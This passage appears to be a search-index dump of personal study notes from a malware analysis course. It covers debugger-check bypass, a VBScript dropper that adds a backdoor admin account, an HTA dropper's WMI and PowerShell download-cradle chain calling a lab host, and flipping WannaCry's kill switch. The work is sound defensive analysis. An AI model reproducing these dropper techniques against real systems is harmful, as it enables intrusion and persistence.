0.</li> </ul> <p>If a debugger is attached:</p> <ul> <li>IsDebuggerPresent() = 1 -&gt; EAX = 1</li> <li>TEST EAX, EAX (bitwise AND of 1 and 1) -&gt; 1</li> <li>Zero Flag = 0 (Zero Flag is cleared because the TEST result was not 0)</li> <li>SETNE AL = 1</li> <li>TEST AL, AL -&gt; 1</li> <li>Zero Flag = 0</li> <li>JE goes to \"No Soup For You!\"</li> </ul> <p>And in the opposite case:</p> <ul> <li>IsDebuggerPresent() = 0 -&gt; EAX = 0</li> <li>TEST EAX, EAX (bitwise AND of 0 and 0) -&gt; 0</li> <li>Zero Flag = 1 (Zero Flag is set because the TEST result was 0)</li> <li>SETNE AL = 0</li> <li>TEST AL, AL -&gt; 0</li> <li>Zero Flag = 1</li> <li>JE goes to \"Boom!\"</li> </ul> <p>This is the low-level equivalent of a conditional statement that would say something like:</p> <pre><code>if (isDebuggerPresent() {\n        MessageBox(GetForegroundWindow(), \"Oh, you think you're slick, huh? I see your debugger over there. No soup for you!\", \"MEGASUSBRO\",MB_OK);\n        exit (EXIT_FAILURE);\n}\nelse {\n        MessageBox(GetForegroundWindow(), \"No debugger detected! Cowabunga, dudes!\", \"COAST IS CLEAR\",MB_OK);\n        MessageBox(GetForegroundWindow(), \"Boom!\", \"PAYLOAD\",MB_OK);\n        exit (EXIT_SUCCESS);\n}\n</code></pre> <p>Note: if the minutia details here are confusing, don\u2019t worry! Low level languages like ASM can be tough to wrap your head around and, in truth, that is the reason why high level languages even exist! Just remember that these low level instructions are really only more primitive, basic versions of the higher level code like you see above. You do not need to know exactly what every instruction is doing in order to identify and defeat anti-analysis techniques.</p> <p>The crux of the matter here is this: if we can find the place where the program evaluates for the debugger and sets values as a result, we can patch or alter the instruction to get it to trigger even in the presence of a debugger. Let\u2019s find out how!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#defeating-simple-anti-analysis","title":"Defeating Simple Anti-analysis","text":"<p>In the Binary Patching section, we used static patching in Cutter to patch out the instructions. Here, let\u2019s use dynamic patching within the debugger itself to show an alternative method of binary patching.</p> <p>In the Binary Patching section, we saved a new copy of the sample binary and overwrote an instruction to alter the code path to our liking. In the method we\u2019ll use for this sample, we can patch the program\u2019s logic without altering its on-disk structure. The patch will be done entirely in the running process memory.</p> <p>First, let\u2019s execute the program in a debugger and see how it functions. Exit out of Cutter and load the program into x64dbg. Run the program (F9) until the message box triggers:</p> <p></p> <p>Let\u2019s find the instruction that performs the <code>IsDebuggerPresent()</code> check. It should be close to the start of the WinMain function, which we saw in Cutter.</p> <p>Restart the program (Ctl+F2) and return to the entry point of the program. Right Click inside the CPU section and select \u201cSearch For \u2192 All Modules \u2192 String References\u201d</p> <p>In the String search panel, enter: <code>IsDebuggerPresent</code></p> <p></p> <p>The string \u201cIsDebuggerPresent\u201d is passed to the <code>LoadLibrary</code> and <code>GetProcAddress</code> functions so it can be resolved and used when the program runs. This is useful to us to get us in the vicinity of where the debugger check is performed in the program. Set a breakpoint on this string reference (F2).</p> <p>Return to the CPU panel and continue the execution of the program by pressing F9. We eventually hit out breakpoint:</p> <p></p> <p>The string reference for \u201cIsDebuggerPresent\u201d is currently being resolved, so we\u2019re close to where we want to be. Continue to step through the program with F8 until you return from this call:</p> <p></p> <p>After returning from this call, we are here in the program (I recommend setting a breakpoint here!):</p> <p></p> <p>This should look familiar! <code>TEST EAX,EAX</code>, then <code>SETNE AL</code>, then <code>TEST AL,AL</code>, then <code>JE</code> to a location in the program. In fact, this is exactly what we saw earlier in Cutter:</p> <p></p> <p>To perform the patch, we need to change the flow of the program. Just like with static patching in the previous section, there are a few ways to do this.</p> <p>Notice how when RIP is on the jump instruction, the Zero Flag is cleared (set to 0). This means that a debugger has been detected and this jump will go to the message box that says \u201cI see your debugger over there!\u201d</p> <p></p> <p>The running process memory is ours to modify to our liking. Hey, if the malware is running on our computer and we\u2019re the administrator, who says we can\u2019t modify the runtime values in memory? No one says that, so we will do just that! Why don\u2019t we change the Zero Flag to a 1? That way, we will jump to the other code path!</p> <p>Double click on the Zero Flag to flip it to a 1:</p> <p></p> <p>Now, the program proceeds to the code path that spawns two message boxes that indicate the coast is clear to run the payload. Continue execution with F8 to see the parameters for each message box get loaded into the registers and then the CALL EAX instructions which spawn the message boxes:</p> <p></p> <p></p> <p>Even with an attached debugger, we have detonation! We have successfully identified and defeated an anti-analysis technique!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#summary_2","title":"Summary","text":"<p>The example in this section is simple but should illustrate the point: anti-analysis measures are meant to slow down the analysis process, but if we are clever and crafty, we can counter these anti-analysis techniques.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#9-specialty-malware-classes","title":"9. Specialty Malware Classes","text":"<p>The next section of this course broadens the scope of malware analysis and explores specialty classes of malware. In this next section, you will explore different types of malware and malicious delivery mechanisms like maldocs, shellcode injection, PowerShell and VBS! Use this opportunity to explore different malware mechanisms and learn more about the many different forms a piece of malware can take.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-specialty-malware-classes","title":"Start Specialty Malware Classes","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#10-gone-phishing-maldoc-analysis","title":"10. Gone Phishing: Maldoc Analysis","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-analyzing-excel-maldocs-oledump","title":"Start Analyzing Excel Maldocs: OLEdump","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-analyzing-word-maldocs-remote-template-macro-injection","title":"Start Analyzing Word Maldocs: Remote Template Macro Injection","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#11-what-the-shell-shellcode-analysis","title":"11. What The Shell? Shellcode Analysis","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-analyzing-shellcode-carving-shellcode-scdbg","title":"Start Analyzing Shellcode: Carving Shellcode &amp; scdbg","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-carving-shellcode-from-memory","title":"Start Carving Shellcode from Memory","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#12-off-script-scripted-malware-delivery-mechanisms","title":"12. Off-Script: Scripted Malware Delivery Mechanisms","text":"VBScript HTML Applications (HTA)"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-powershell-analyzing-obfuscated-scripts","title":"Start PowerShell: Analyzing Obfuscated Scripts","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#vbscript-analyzing-a-multi-stage-msbuild-dropper","title":"VBScript: Analyzing a Multi-Stage MSBuild Dropper","text":"<p>VBScript Lab</p> <p>The script will decode both cert files and send them to a location, the output files are one.vbs &amp; xml.xml, it will then wait 100 ms and will run one.vbs afterwards.</p> <p></p> <p>If we read the code we will see that it's replacing all vVv with nothing \"\"</p> <p></p> <p>If we do that, now we see what's going on. The GetObject here contains a COM Class (Component Model Object). COM is one of the most abusable features of the Windows OS.</p> <p>This COM is invoking ShellBrowserWindow to run a Shell command, it will do in a hiden window <code>that's the 0 value</code> and it will try to <code>runas</code> Administrator and will run the contents of the <code>xml.xml</code></p> <p></p> <p>We can run the sample to see what it's doing, well in the first run since we didn't run as Admin, nothing happened</p> <p></p> <p>Lets see what happens if we run it as Admin. Creating adding a user to the remote desktop User Group, adding that user to the Administrator's Group then opening up a port on the Firewall to open RDP if not already open up.</p> <p></p> <p>All of that is obfuscated in this Hex</p> <p></p> <p>The user is <code>wdsadmin</code></p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#html-applications-hta-wrapped-payloads-scripted-delivery-wmi","title":"HTML Applications (HTA): Wrapped Payloads, Scripted Delivery, &amp; WMI","text":"<p>Lab File(s)</p> Introduction The Offensive Potential of HTML JavaScript Is Dangerous Enter, HTML Applications Analyzing HTAs Static Analysis Invoking WMI &amp; Executing PowerShell Dynamic Analysis Summary"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#introduction_3","title":"Introduction","text":"<p>On the subject of scripted malware delivery mechanisms, let\u2019s examine a curious class of malware called the HTML Application (HTA) file. HTAs are commonly used as the payload of phishing attacks. By the end of this section, you\u2019ll see why this is the case.</p> <p>Extract the sample and let\u2019s get going!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#the-offensive-potential-of-html","title":"The Offensive Potential of HTML","text":"<p>It is no secret that HTML can be weaponized. Every time you visit a website, your web browser downloads and renders the code that is served out by that website. Your browser is really just an interpreter for the technologies that power the web: HTML, CSS, and JavaScript.</p> <p>HTML provides the structure of the website. CSS applies color, fonts, presentation, and layouts of the website. And JavaScript can dynamically control behavior of elements of the website.</p> <p>It\u2019s that last one that we need to watch out for.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#javascript-is-dangerous","title":"JavaScript Is Dangerous","text":"<p>You may be familiar with the classic Cross-Site Scripting test that pops an alert box by injecting the <code>&lt;script&gt;</code> block into an HTML page. If you\u2019ve seen this test before, you may have wondered \u201cwhat is actually going on when this happens?\u201d</p> <p></p> <p>HTML pages can define the <code>&lt;script&gt;</code> tag to include code that can run different scripting languages. In most cases, the language is JavaScript. JavaScript can execute code within the browser to move components around on the page, change colors and fonts, pop that alert box, and do many other functions. Think of JavaScript as the programmatic engine of HTML.</p> <p>The W3 Schools demo for JavaScript\u2019s alert() box method demonstrates this well.</p> <p>Try saving this code to <code>index.html</code> and running it locally by opening it in a web browser</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;h1&gt;The Window Object&lt;/h1&gt;\n&lt;h2&gt;The alert() Method&lt;/h2&gt;\n\n&lt;p&gt;Click the button to display an alert box.&lt;/p&gt;\n\n&lt;button onclick=\"myFunction()\"&gt;Try it&lt;/button&gt;\n\n&lt;script&gt;\nfunction myFunction() {\nalert(\"Hello! I am an alert box!\");\n}\n&lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>The takeaway here is that JavaScript executes code within the browser. But when JavaScript executes within a web browser, the code execution is confined to the web browser itself. That is to say, the code runs in the context of the browser, manipulates the document model of the web page, and can manipulate cookies, but can\u2019t reach the operating system of the host unless there is some kind of browser based code execution vulnerability.</p> <p>When used in an offensive capacity, JavaScript can perform activities like hooking the client\u2019s browser (see the BeEF Framework for an example of this) and downloading files via HTML Smuggling. The offensive potential of JavaScript is apparent, but if it\u2019s usually limited to the browser of the victim, then that doesn\u2019t sound so bad, right?</p> <p>Wrong!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#enter-html-applications","title":"Enter, HTML Applications","text":"<p>Imagine that a developer needs to design a compact, portable HTML site that can be easily sent to anyone who needs it. Maybe it\u2019s a company survey. Maybe it\u2019s a presentation of some sort. The developer can create an HTML Application (HTA) file for this purpose.</p> <p>HTAs are Windows-executable, packaged HTML files that run HTML, CSS, and Windows native scripting languages from a single file outside of the context of the web browser. The last part of that sentence is the really scary thing here: HTAs do not run in the context of the Windows web browser, but instead run as a trusted application on the operating system.</p> <p>An HTML Application is not much different from a normal HTML page in terms of construction. In fact, you can use the exact same code from an HTML page to make an HTA.</p> <p>Try it out yourself \u2014 take the W3 Schools code for the JavaScript alert() method that we just used, open a new text file, write that HTML code into the file, and save it as <code>test.hta</code> on your FLARE-VM host. Then, double click on the file</p> <p></p> <p>The window that spawns is a self contained Windows application that renders and runs the HTML, CSS, and/or scripting code that is packaged inside of it. If we click on the Try it button, we see that this application can execute the embedded JavaScript code</p> <p></p> <p>The scripting languages we can use here are not limited to JavaScript (or JScript in the context of Windows). We can embed any Windows-native scripting language inside of an HTA and it will execute the provided code. This includes JavaScript/JScript, VBScript, and both together in the same file.</p> <p>In the previous section, we saw how VBScript can be weaponized. So the thought of a self contained HTML application that can execute code dynamically and have it run on the operating system of the victim should spark our concern.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#analyzing-htas","title":"Analyzing HTAs","text":"<p>Let\u2019s examine a weaponized HTA and unravel its functionality to demonstrate how to analyze these files.</p> <p>The sample archive is called <code>Dropper.hta.malz</code>. Let\u2019s rename this to <code>Dropper.hta</code>. When we do this, notice that Windows changes the file icon to an application icon</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#static-analysis","title":"Static Analysis","text":"<p>Recall that an HTA is still, under the hood, HTML in a single file. Let\u2019s open this file in Visual Studio Code to examine the HTML located within it:</p> <pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;&lt;/title&gt;\n&lt;body&gt;\n&lt;script language=\"JavaScript\" type=\"text/javascript\"&gt;\ndocument.write(unescape('%3c%68%74%6d%6c....[snip]......'));\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Take note of the contents of this file. The actual HTML of the application is barren but has one notable feature. The <code>&lt;script&gt;</code> tag wraps a call to the JavaScript <code>document.write()</code> method. This call to <code>document.write()</code> has a block of characters that are delimited by percent signs inside of the <code>unescape()</code> method. Let\u2019s examine both methods to identify what they do:</p> <pre><code>- `document.write()`: The `write()` method writes directly to an open (HTML) document stream.\n- `unescape()`: The `unescape()` function computes a new string in which hexadecimal escape sequences are replaced with the characters that they represent.\n</code></pre> <p>Immediately, we have an idea of what\u2019s going on here:</p> <pre><code>- The block of characters inside the `unescape()` method is a bunch of hexadecimal bytes that are interpreted and replaced by the character that they represent.\n- Then, the interpreted characters are written to the document of the page.\n</code></pre> <p>We can decode the block of hex characters in CyberChef by using the <code>From Hex</code> item and delimiting by percent sign. FLARE-VM installs a local instance of CyberChef in the <code>C:\\Tools\\cyberchef directory</code>. An online instance of CyberChef is also running at the following link CyberChef</p> <p>Using CyberChef, we add the <code>From Hex</code> decoder and change the delimiter to <code>Percent</code>. Then, we copy the block of hex bytes into the Input section:</p> <p></p> <p>The Output section now contains the following</p> <p></p> <p>Several things are concerning about this!</p> <p>When the HTA is executed, it decodes and writes this HTML to the page. This block of HTML contains another script block that invokes VBScript to run code. But what does the code do?</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#invoking-wmi-executing-powershell","title":"Invoking WMI &amp; Executing PowerShell","text":"<p>The VBScript code starts by setting up the required parameters to invoke Windows Management Instrumentation (WMI) to execute a process. WMI is a part of the Windows operating system that acts as an interface for management purposes. It is extremely powerful and complicated and most of its functionality is outside the scope of this course, but it can do a few things that make it relevant for malware analysis.</p> <p>WMI can start and run processes through the Win32_Process namespace. Effectively, this means that anything that can access WMI can execute a process.</p> <p>In our sample, the VBScript code is setting WMI up to be able to execute a process</p> <p></p> <p>The VBScript then performs the following</p> <p></p> <p>This line executes a process through the WMI service and returns the results to the <code>Error</code> variable.</p> <p>The process argument here runs a command shell which, in turn, runs PowerShell in a hidden window. When PowerShell is executed, it performs the following</p> <p></p> <p>The VBScript then calls <code>window.close()</code> to close out of the HTA window.</p> <p>If we take a step back, we now have a clear idea of the execution chain here:</p> <pre><code>- HTA is opened and runs the embedded JavaScript.\n- The JavaScript decodes the hex bytes of an inner HTML document and writes it into the HTA.\n- The inner HTML document invokes VBScript to execute WMI.\n- WMI runs a process to call a command shell.\n- The command shell, in turn, runs PowerShell in a hidden window.\n- PowerShell runs a download cradle command to reach out to `http://tailofawhale.local/TellAndSentFor.exe`, write it to the %temp% directory as jLoader.exe and then execute `jLoader.exe`.\n</code></pre> <p>With a good understanding of the payload, let\u2019s move onto dynamic analysis to see it in action!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>When we open the HTA program, a window flashes for a moment and then disappears. If we are running INetSim at the time of detonation, we see the default INetSim binary spawn. Take note of the location where the binary is running from</p> <p></p> <p>Dropper.hta has clearly succeeded in downloading and executing something. Let\u2019s examine the network signatures.</p> <p>In Wireshark, we see the outbound DNS request for <code>tailofawhale.local</code> and its DNS resolution</p> <p></p> <p>We can also see the HTTP request to the malicious domain and response in Wireshark</p> <p></p> <p>If we go to examine host-based indicators, we run into a small snag. There is no process called \u201cDropper.hta\u201d anywhere in the list of running processes on the host. Where does this process execute?</p> <p>HTAs do not execute directly. When double-clicked, they are passed to the native Windows binary <code>mshta.exe</code> which executes them on its behalf. <code>mshta.exe</code> acts as an HTML interpreter and loads the HTML from the HTA along with any DLLs that deal with script execution and then executes the program all at once.</p> <p>If we look in the Procmon process tree after detonation, we see an invocation of <code>mshta.exe</code> that takes the path to our HTA sample as its argument</p> <p></p> <p></p> <p>We\u2019ve accounted for the execution of the HTA, but we haven\u2019t accounted for the other parts of the payload yet. Where is the call to PowerShell and the command shell?</p> <p>Higher up in the process list, there is an instance of svchost.exe that is executing a process called wmiprvse.exe. This is the way that Windows invokes WMI to execute processes</p> <p></p> <p>We can follow the <code>wmiprvse.exe</code> process all the way down through the call to PowerShell and, eventually, the execution of the <code>jLoader.exe</code> program. In this case, this was our INetSim default binary that spawned the message box, but in real life this is likely a second stage payload.</p> <p>After annotating these details, we have effectively analyzed the HTA dropper sample.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#summary_3","title":"Summary","text":"<p>This section covered the analysis methodology of the HTA, a curious little file format that wraps all of the functionality of HTML into a single file and executes it directly on the Windows OS. It also covered a bit about how WMI can execute processes.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#reversing-c-malware","title":"Reversing C# Malware","text":"Reversing C# &amp; the .NET Framework Reversing an Encrypted C2 Dropper"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#intro-to-reversing-c-the-net-framework","title":"Intro to Reversing C# &amp; the .NET Framework","text":"<p>Lab File(s)</p> <p>Floss the sample &gt; we see mscorlib so it's C#, also another clue is the .NETFramework version</p> <p>How Does C# Code Get Compiled and Executed?</p> <p></p> <ul> <li>Compiling C# Code</li> <li>Once the code is written, it needs to be compiled into MSIL code using the C# compiler.</li> <li>This creates an assembly that contains the compiled code and any metadata that describes the code.</li> <li>Loading the Assembly</li> <li>The assembly is loaded into the CLR, which loads the code into memory and performs a number of checks to ensure that the code is safe to execute.</li> <li>This includes verifying that the code has not been tampered with and that it is signed with a valid digital signature.</li> <li>JIT Compilation</li> <li>The MSIL code is then compiled by the Just-In-Time (JIT) compiler into native machine code that can be executed on the computer\u2019s processor.</li> <li>This code is generated dynamically at runtime and is optimized for the specific hardware and operating system on which it is running.</li> <li>Execution</li> <li>The native machine code can now be executed by the computer\u2019s processor, which runs the C# application.</li> <li>During execution, the CLR manages the memory and resources used by the application, including performing garbage collection to free up memory that is no longer being used.</li> </ul> <p>Language C# C# Compiler translate language to IL &gt; so compiles into an Assembly such as .exe IL (Intermediate Language) Creation CLR (Common Language Runtime) This is how a C# program is execution OS</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#reversing-an-encrypted-c2-dropper-dll-with-dnspy","title":"Reversing an Encrypted C2 Dropper DLL with dnSpy","text":"<p>Lab File(s)</p> <p>Errata Note: dnSpy is available at the following GitHub repository</p> <p>Note The tool I use at the 12:15 mark is Fakenet-NG, which is a built-in network simulator on FLARE-VM. It is basically the same as INetSim, but runs on the FLARE-VM host instead of on REMnux. I left it out of the course because it tends to be very buggy and mess up the networking stack on the FLARE-VM host, but it helps to set up a quick network simulator on FLARE-VM.</p> <p>The important part is that it catches the callback domain name for this C2 dropper, which can also be identified with INetSim.</p> <p>load the sample into dnSpy</p> <p></p> <p>dnSpy will reassemble the binary code. In this sample it seems when the program was compiled it was named <code>EmbedDLL</code></p> <p></p> <p>This program loads up a base64 into memory which it will decrypt with provided password, it will also end up with creating a registry file</p> <p></p> <p>How to run dlls?</p> <p>In order to run a dll you need to know the functions it has defined so you can call the dll and its function, in this case the function is called <code>embed</code></p> <p></p> <pre><code>rundll32 &lt;sample_dll&gt;,&lt;function&gt;\n</code></pre> <p></p> <p>If we check the location of the files as stated in the code we will see them</p> <p></p> <p></p> <p>Check registry as well</p> <p></p> <p>So the registry is calling to the VBS script which is calling the xml script, it's runs when someone logs in</p> <p></p> <p>Checking the XML</p> <p></p> <p>Seems to be using an Evasion Technique by loading Reflection Assembly</p> <p></p> <p>If we run the VBScript we will see the DNS call in <code>fakenet.exe</code></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#analyzing-go-malware","title":"Analyzing Go Malware","text":"Programming Language"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#programming-language-recognition-analyzing-a-go-service-backdoor","title":"Programming Language Recognition &amp; Analyzing a Go Service Backdoor","text":"<p>Lab File(s)</p> <p>References</p> <ul> <li>Unit42 The Gopher</li> <li>Merlin C2 Agent written in Go</li> </ul> <p>Notice that the binary size for <code>Go</code> is huge, almost 7MB for about 20 lines of code</p> <p></p> <p>floss the sample</p> <p></p> <p></p> <p>We can also try something like this</p> <p></p> <p>References for golang</p> <p></p> <p></p> <p>.symtab showed up when loading the sample into PEbear</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#mobile-malware-analysis","title":"Mobile Malware Analysis","text":"Lab Update: Installing MobSF MobSF"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#lab-update-installing-mobsf","title":"Lab Update: Installing MobSF","text":"<p>MobSF Docker Install Instructions</p> <p>In order for us to install the tool we need, we need to change the Network to NAT on the Remnux vm then reboot the vm.</p> <p>Installing MobSF on docker, we won't be able to do Dynamic Analysis but we can do Static Analysis</p> <pre><code>docker pull opensecurity/mobile-security-framework-mobsf\ndocker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n</code></pre> <p>Now after install is completed, we need to switch back the Network adapter on the vm to <code>Host-only Adapter</code> then reboot the vm.</p> <p>execute this</p> <pre><code>docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n</code></pre> <p></p> <p>You should be able to use it now.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#intro-to-mobsf","title":"Intro to MobSF","text":"<p>Lab File(s)</p> <p>Update 11/13/21: A few weeks after the release of this course, Aaron Wilson released the Mobile Application Penetration Testing course here at TCM Academy. While this part of the course scratches the surface of reverse engineering Android applications, Aaron's course is a full, in-depth look at mobile application pentester methodology. The skill overlap between RE and pentesting mobile applications is significant, so check his course out if you're hungry for more mobile app security!</p> <p>(Aaron's affiliate link is used in the hyperlink above for full disclosure. I make nothing off the purchase of the course, I'm simply a big fan of what he's put together!)</p> <p></p> <p>Rename the sample to APK then upload it</p> <p></p> <p>We can see the Java source code</p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#analyzing-real-world-malware-samples","title":"Analyzing Real-World Malware Samples","text":"WannaCry.exe"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#wannacryexe-introduction-walkthrough","title":"WannaCry.exe Introduction &amp; Walkthrough","text":"<p>Lab File(s)</p> <p>GhidraNinja: Reversing Wannacry Part 1</p> floss <p></p> <p>We see the DOS message multiple times which could indicate multiple excutables, multiple stages. We also see a lot of API calls</p> <p></p> <p></p> <p></p> <p></p> PEStudio <p> </p> <p></p> <p></p> INetSim <p>So if we have INetSim running and trying to get a packet capture going we will see that the url is gets a <code>200 ok</code>, it will stop executing the malware.</p> <p>So for our case we will need to have INetSim (disabled/not running) and we can use some of the other local tools</p> TCPView <p>We will see the APIPA address being called, which isn't really pointing anywhere. APIPA [Automatic Private IP Addressing] range is [169.254.0.0 TO 169.254.255.255].</p> <p>The port it's trying however is the SMB port of 445. ALso it's seems to be trying different IPs on the Network to spread itself (has worm capabilities)</p> <p></p> <p>Attempting to open a listener on port <code>9050</code></p> <p></p> Procmon <p>Host indicators</p> <p>setup thefilters</p> <p></p> <p>Run the binary as admin and see what happens</p> <p></p> <p>We find some task scheduler activities going on</p> <p></p> <p>Process tree </p> <p></p> <p>So we know the parent PID is <code>3336</code>, we can filter on that as Parent PID</p> <p></p> <p>We see the beginning of the exection of second stage</p> <p></p> <p>Filter for <code>Operation</code> <code>CreateFile</code></p> <p></p> <p>We see that it's creating a directory in <code>c:\\ProgramData\\</code></p> <p></p> <p>The staging area</p> <p></p> <p>We see a service created with the same name as the weird folder name. So this will be the service that will re-encrypt everything once you restart your computer</p> <p></p> Cutter <p></p> <p></p> <p></p> Debugger x32dbg <p>Search for string reference the url</p> <p></p> <p>We want to set a breakpoint at that address location (F2)</p> <p></p> <p>Hit F9 until you see the URL</p> <p></p> <p>We keep stepping over and we see the next call</p> <p></p> <p>We check the <code>test edi, edi</code>, this is teh result of the <code>InternetOpenUrl</code> Call. We see that the EDI value isn't cleared out, it's <code>00CC000C</code>.</p> <p>If we hit <code>F8</code> we will see the test result shown in next figure</p> <p></p> <p>So the test result reflected in <code>ZF</code> is <code>0</code>, which means the flag was cleared due to API call <code>InternetOpenUrl</code> returning a result</p> <p></p> <p>So now the <code>jne</code> will evaluate the <code>ZF</code> result. If the <code>ZF</code> flag is set to <code>0</code> take the jump to exit the program, if not then continue to the next Call.</p> <p>This is the kill switch that stops the Malware from running.</p> <p></p> <p>So if we change the <code>ZF</code> value to '1', the program will not jump and will insteadcontinue to the next API Call</p> <p></p> <p>Now we will see that the call was made and the Malware started doing it's file Encryption magic</p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#automation-sandboxes-pipelines","title":"Automation: Sandboxes &amp; Pipelines","text":"BlueJupyter"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#bluejupyter-automating-triage-with-jupyter-notebooks","title":"BlueJupyter: Automating Triage with Jupyter Notebooks","text":"<p>Lab File(s)</p> <p>Note For this section of the course, I am working on my Linux development workstation. This is outside of my lab environment. I confirmed that Blue-Jupyter functions as intended if you install it on REMnux, so feel free to carefully add REMnux back onto a NAT adapter and follow the install instructions for Blue-Jupyter. <p>Update 2/18/22: Dockerized Blue-Jupyter Installation Instructions</p> <p>I have Dockerized the Blue-Jupyter application to cut down on the number of poetry and pip errors that were plaguing the code! Please follow these instructions to install and run the Dockerized version of the app. Note that these instructions are different than what you see in the video:</p> <p>Clone the PMAT-lab branch of the code repository and change directories into it:</p> <pre><code>remnux@remnux:~$ git clone --branch PMAT-lab https://github.com/HuskyHacks/blue-jupyter.git &amp;&amp; cd blue-jupyter\n</code></pre> <p>Run the following Docker build command:</p> <pre><code>remnux@remnux:~/blue-jupyter$ sudo docker build -t bluejupyter .\n</code></pre> <p>When the image is finished building, run the following command to launch the notebook with a published port of 8888 and a mounted volume to the dropbox directory:</p> <pre><code>remnux@remnux:~/blue-jupyter$ sudo docker run -it -p 8888:8888 -v /home/remnux/blue-jupyter:/src bluejupyter\n</code></pre> <p>Now, if you want to add malware to the dropbox, copy it from the PMAT-labs repository into the <code>/home/remnux/blue-jupyter/malware-analysis/dropbox/</code> directory and it will also copy into the container.</p> <p>You can then proceed to follow the instructions from the video.</p> <p>Please note that you need to be connected to the internet and must use a valid VirusTotal API key to get the API results. VirusTotal Public API keys are free and you can sign up for one here VirusTotal API Key Signup</p> <p>Once you are done, make sure to remove REMnux from the NAT adapter and double-check that it is back in the isolated lab environment.</p> <p>References:</p> <ul> <li>Taggart Tech Youtube Channel</li> <li>Taggart Tech Twitch</li> <li>@MalwareUnicorn</li> <li>Referenced ShellCon talk</li> <li>Linux Dev Workstation</li> </ul> Any.Run ChatGPT Script Analysis Mindmaps Extras"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#anyrun-malware-sandboxing","title":"Any.Run: Malware Sandboxing","text":"<p>Update 11/8/22</p> <p>It appears that ANY.RUN now requires you to provide a business email to sign up for an account.</p> <p>I will not fault anyone for not wanting to provide a business email for this purpose. Feel free to skip the practical portion of this section and simply watch the video. Alternatively, another sandbox site called Hatching Triage offers free personal use accounts and does not require a business email. I love Triage and use them for my personal and professional research and recommend their services for this purpose. Please note that their account creation process does take some time due to their verification process. </p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#advanced-script-analysis-with-chatgpt","title":"Advanced Script Analysis with ChatGPT","text":"<p>Lab File(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#rule-writing-report-publishing","title":"Rule Writing &amp; Report Publishing","text":"YARA Rules Detection with YARA Writing &amp; Publishing Analysis 